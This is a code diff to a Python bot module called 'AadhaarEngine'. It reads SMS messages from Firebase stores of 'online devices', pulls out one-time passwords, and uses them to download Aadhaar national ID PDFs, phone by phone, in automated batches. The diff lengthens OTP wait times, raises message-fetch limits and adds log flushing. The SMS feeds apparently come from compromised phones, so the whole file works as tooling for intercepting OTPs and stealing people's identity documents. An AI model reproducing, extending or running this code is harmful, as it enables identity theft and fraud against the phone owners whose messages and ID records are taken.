@@ -26,13 +26,22 @@ _logging.getLogger("urllib3").setLevel(_logging.ERROR)
 DEVELOPER_USERNAME = os.getenv('DEVELOPER_USERNAME', 'DARKVENDOR07')
 
 # ==============================================================================
-# 🎯 AUTO PIPELINE CONFIG — SEQUENTIAL MODE
+# 🎯 AUTO PIPELINE CONFIG — MATCHED TO aad.py
 # ==============================================================================
 AUTO_PARALLEL_WORKERS = 1        # STRICTLY 1 — one phone at a time
-EID_OTP_TIMEOUT = 45              # 1st OTP wait window
-PDF_OTP_TIMEOUT = 45              # 2nd OTP wait window
-OTP_FALLBACK_TIMEOUT = 0          # no extra wait — filter should suffice
-INTER_PHONE_DELAY = 2             # seconds between phones (avoid rate limit)
+EID_OTP_TIMEOUT = 60              # 1st OTP wait window (same as aad.py)
+PDF_OTP_TIMEOUT = 60              # 2nd OTP wait window (same as aad.py)
+OTP_FALLBACK_TIMEOUT = 0          # no extra wait
+INTER_PHONE_DELAY = 2             # seconds between phones
+
+# ---- TEMPORARY VERSION PROBE (remove after confirming on Railway) ----
+print("=" * 60, flush=True)
+print(f"[VERSION] aadhaar_engine loaded from: {__file__}", flush=True)
+print(f"[VERSION] EID_OTP_TIMEOUT = {EID_OTP_TIMEOUT}", flush=True)
+print(f"[VERSION] PDF_OTP_TIMEOUT = {PDF_OTP_TIMEOUT}", flush=True)
+print(f"[VERSION] OTP_FALLBACK_TIMEOUT = {OTP_FALLBACK_TIMEOUT}", flush=True)
+print(f"[VERSION] AUTO_PARALLEL_WORKERS = {AUTO_PARALLEL_WORKERS}", flush=True)
+print("=" * 60, flush=True)
 
 
 def escape_html(s):
@@ -68,7 +77,6 @@ def _extract_real_error(stderr_str: str) -> str:
     return meaningful[-1]
 
 
-# Errors that should NOT be retried (permanent failures)
 _NON_RETRYABLE_PATTERNS = (
     "no record found",
     "no record",
@@ -82,7 +90,6 @@ _NON_RETRYABLE_PATTERNS = (
     "aadhaar not linked",
     "no aadhaar",
     "record not found",
-    # OTP timeouts — retrying won't help since SMS didn't arrive
     "received within",
     "no eid otp",
     "no pdf otp",
@@ -90,7 +97,6 @@ _NON_RETRYABLE_PATTERNS = (
 
 
 def _is_non_retryable(err_msg: str) -> bool:
-    """Return True if the error is permanent (don't waste retries)."""
     if not err_msg:
         return False
     e = err_msg.lower()
@@ -132,7 +138,7 @@ auto_pipelines = {}
 
 
 # ==============================================================================
-# 🔥 FIREBASE HELPERS
+# 🔥 FIREBASE HELPERS — MATCHED TO aad.py (limitToLast=30)
 # ==============================================================================
 FIREBASE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase_links.json")
 
@@ -257,7 +263,8 @@ async def firebase_get_online_devices(session, url, limit=None):
         return []
 
 
-async def firebase_get_device_messages(session, url, cid, limit=5):
+# ✅ CHANGED: default limit=30 to match aad.py
+async def firebase_get_device_messages(session, url, cid, limit=30):
     try:
         fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}'
         async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
@@ -306,7 +313,8 @@ async def firebase_find_phone_map(session, url, limit_devices=None):
     mapping = {}
     seen_phones = set()
     for cid in devices:
-        msgs = await firebase_get_device_messages(session, url, cid, limit=5)
+        # ✅ CHANGED: limit=30
+        msgs = await firebase_get_device_messages(session, url, cid, limit=30)
         if not msgs:
             continue
         phone = firebase_extract_phone(msgs)
@@ -316,17 +324,18 @@ async def firebase_find_phone_map(session, url, limit_devices=None):
     return mapping
 
 
-async def firebase_wait_for_otp(url, cid, known_keys, timeout=45, interval=3, session=None,
+async def firebase_wait_for_otp(url, cid, known_keys, timeout=60, interval=3, session=None,
                                  require_keywords=None, exclude_keywords=None):
     own = session is None
     if own:
         session = aiohttp.ClientSession()
     try:
         iterations = max(1, timeout // interval)
-        print(f"[OTP-WAIT] start timeout={timeout}s iterations={iterations} cid={cid[:10]}")
+        print(f"[OTP-WAIT] start timeout={timeout}s iterations={iterations} cid={cid[:10]}", flush=True)
         for i in range(iterations):
             try:
-                fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=5'
+                # ✅ CHANGED: limitToLast=30 (matches aad.py)
+                fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=30'
                 async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                     msgs = await r.json() or {}
                 if isinstance(msgs, dict):
@@ -345,12 +354,12 @@ async def firebase_wait_for_otp(url, cid, known_keys, timeout=45, interval=3, se
                             continue
                         otp = firebase_extract_otp(txt)
                         if otp and otp not in ("000000", "123456", "111111", "999999"):
-                            print(f"[OTP-WAIT] FOUND otp={otp} after {i+1} iterations")
+                            print(f"[OTP-WAIT] FOUND otp={otp} after {i+1} iterations", flush=True)
                             return otp, key
             except Exception as e:
-                print(f"[OTP-WAIT] iter {i+1} error: {type(e).__name__}: {str(e)[:80]}")
+                print(f"[OTP-WAIT] iter {i+1} error: {type(e).__name__}: {str(e)[:80]}", flush=True)
             await asyncio.sleep(interval)
-        print(f"[OTP-WAIT] TIMEOUT after {iterations} iterations ({timeout}s)")
+        print(f"[OTP-WAIT] TIMEOUT after {iterations} iterations ({timeout}s)", flush=True)
         return None, None
     finally:
         if own:
@@ -546,7 +555,7 @@ class AadhaarEngine:
         finally:
             user_page_registry.pop(str_chat_id, None)
 
-    async def _try_firebase_otp(self, target_mobile, timeout=45, phase=1):
+    async def _try_firebase_otp(self, target_mobile, timeout=60, phase=1):
         bound_url = getattr(self, "_bound_url", None)
         bound_cid = getattr(self, "_bound_cid", None)
 
@@ -573,7 +582,6 @@ class AadhaarEngine:
                         auto_otp_state["used_otps"].add((bound_url, key))
                         return otp
 
-                    # Optional short fallback (disabled by default)
                     if OTP_FALLBACK_TIMEOUT > 0:
                         otp, key = await firebase_wait_for_otp(
                             bound_url, bound_cid, known,
@@ -618,12 +626,12 @@ class AadhaarEngine:
         last_err = ""
         for attempt in range(1, self._retry_max + 1):
             try:
-                print(f"▶️ [AUTO] #{idx}/{total} {phone} (attempt {attempt})")
+                print(f"▶️ [AUTO] #{idx}/{total} {phone} (attempt {attempt})", flush=True)
                 await self._auto_single_attempt(chat_id, phone, url, cid, idx, total, attempt)
                 return True
             except Exception as e:
                 last_err = str(e)
-                print(f"❌ [AUTO] #{idx}/{total} {phone} attempt {attempt} failed: {last_err}")
+                print(f"❌ [AUTO] #{idx}/{total} {phone} attempt {attempt} failed: {last_err}", flush=True)
 
                 if _is_non_retryable(last_err):
                     self.update_status(
@@ -727,6 +735,7 @@ class AadhaarEngine:
         script_dir = os.path.dirname(os.path.abspath(__file__))
         get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
 
+        # ✅ Pass "auto" as 6th arg so retrive-eid.py sends name as-is
         process = await asyncio.create_subprocess_exec(
             sys.executable, '-u', get_eid_script, name, "", phone, self._unique_suffix, "auto",
             stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
@@ -742,7 +751,7 @@ class AadhaarEngine:
                 if not line_bytes:
                     break
                 line = line_bytes.decode('utf-8', errors='ignore').strip()
-                print(f"[get_eid auto {phone}] {line}")
+                print(f"[get_eid auto {phone}] {line}", flush=True)
 
                 if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                     captcha_attempts += 1
@@ -821,7 +830,7 @@ class AadhaarEngine:
                 if not line_bytes:
                     break
                 line = line_bytes.decode('utf-8', errors='ignore').strip()
-                print(f"[aadhar-downlaod auto {phone}] {line}")
+                print(f"[aadhar-downlaod auto {phone}] {line}", flush=True)
 
                 if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                     captcha_attempts += 1
@@ -891,6 +900,7 @@ class AadhaarEngine:
         process = None
         captured_real_name = name
         try:
+            # ⚠️ No "auto" flag here → manual mode with prefix rotation
             process = await asyncio.create_subprocess_exec(
                 sys.executable, '-u', get_eid_script, name, str(formatted_dob_iso), mobile,
                 self._unique_suffix,
@@ -1219,7 +1229,6 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             except: pass
         return
 
-    # ---- 2. Trim to requested count ----
     targets = all_targets if max_phones is None else all_targets[:max_phones]
     total = len(targets)
 
@@ -1251,7 +1260,7 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
         url = t["url"]
         cid = t["cid"]
 
-        print(f"\n▶️ [AUTO SEQ] ============ Starting #{idx}/{total}: {phone} ============")
+        print(f"\n▶️ [AUTO SEQ] ============ Starting #{idx}/{total}: {phone} ============", flush=True)
 
         engine = AadhaarEngine(bot, chat_id=chat_id)
         engine._unique_suffix = f"_a{idx}"
@@ -1269,12 +1278,12 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             success = await engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total)
             if success:
                 results["success"] += 1
-                print(f"✅ [AUTO SEQ] #{idx}/{total} {phone} SUCCESS")
+                print(f"✅ [AUTO SEQ] #{idx}/{total} {phone} SUCCESS", flush=True)
             else:
                 results["failed"] += 1
-                print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} FAILED")
+                print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} FAILED", flush=True)
         except Exception as e:
-            print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} crashed: {e}")
+            print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} crashed: {e}", flush=True)
             results["failed"] += 1
         finally:
             try:
@@ -1285,7 +1294,7 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             except: pass
 
         if idx < total:
-            print(f"⏸️ [AUTO SEQ] Pausing {INTER_PHONE_DELAY}s before next phone...")
+            print(f"⏸️ [AUTO SEQ] Pausing {INTER_PHONE_DELAY}s before next phone...", flush=True)
             await asyncio.sleep(INTER_PHONE_DELAY)
 
     summary = (
@@ -1300,7 +1309,7 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
         bot.send_message(chat_id, summary, parse_mode='HTML')
     except: pass
 
-    print(f"🏁 [AUTO SEQ] Batch {batch_id} complete: {results['success']} ok / {results['failed']} failed")
+    print(f"🏁 [AUTO SEQ] Batch {batch_id} complete: {results['success']} ok / {results['failed']} failed", flush=True)
 
 
 def start_auto_batch(bot, chat_id, max_phones=None):
